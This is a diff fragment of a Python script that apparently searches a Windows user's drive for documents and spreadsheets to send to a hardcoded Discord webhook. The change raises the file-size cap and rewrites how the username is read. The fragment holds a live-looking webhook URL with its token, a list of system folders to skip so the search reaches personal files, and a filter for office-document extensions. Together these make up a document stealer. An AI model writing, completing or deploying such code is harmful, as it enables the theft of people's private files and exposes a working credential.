@@ -17,18 +17,16 @@ win32gui.EnumWindows(enum_windows, windows)
 
 
 
-user = getpass.getuser()
-%a = user
+user = os.environ.get('USERNAME')
 
-path = "C:\\Users\\%a" % user
 
 
 
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1183181478645997698/bmS94RKPMhnfSInRJZ2fu_0zctdvhRXi1wTj5lfbJ91jVEehz90MGk09DWKP12iyJMQQ"
 # Directories to ignore during file search
-BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\%a\\AppData\\', 'C:\\Users\\%a\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\', 'C:\\XboxGames\\', 'C:\\Users\\Default\\', 'C:\\Users\\defaultuser100000\\', 'C:\\Users\\Public\\', 'C:\\Users\\%a\\3D Objects\\', 'C:\\Users\\%a\\Contacts\\', 'C:\\Users\\%a\\Favorites\\', 'C:\\Users\\%a\\Microsoft\\', 'C:\\Users\\%a\\Music\\', 'C:\\Users\\%a\\OneDrive\\Documents\\', 'C:\\Users\\%a\\Saved Games\\', 'C:\\Users\\%a\\Searches\\', 'C:\\Users\\%a\\Tracing\\', 'C:\\Users\\%a\\NTUSER.DAT\\', 'C:\\Users\\%a\\.thinkorswim\\']
-MAX_FILE_SIZE_MB = 8
+BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\user\\AppData\\', 'C:\\Users\\user\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\', 'C:\\XboxGames\\', 'C:\\Users\\Default\\', 'C:\\Users\\defaultuser100000\\', 'C:\\Users\\Public\\', 'C:\\Users\\user\\3D Objects\\', 'C:\\Users\\user\\Contacts\\', 'C:\\Users\\user\\Favorites\\', 'C:\\Users\\user\\Microsoft\\', 'C:\\Users\\user\\Music\\', 'C:\\Users\\user\\OneDrive\\Documents\\', 'C:\\Users\\user\\Saved Games\\', 'C:\\Users\\user\\Searches\\', 'C:\\Users\\user\\Tracing\\', 'C:\\Users\\user\\NTUSER.DAT\\', 'C:\\Users\\user\\.thinkorswim\\']
+MAX_FILE_SIZE_MB = 25
 def check_file(file_path):
     allowed_extensions = ['.pdf', '.docx', '.xls', '.xlsx', '.docx', '.csv']
     max_size_mb = 8
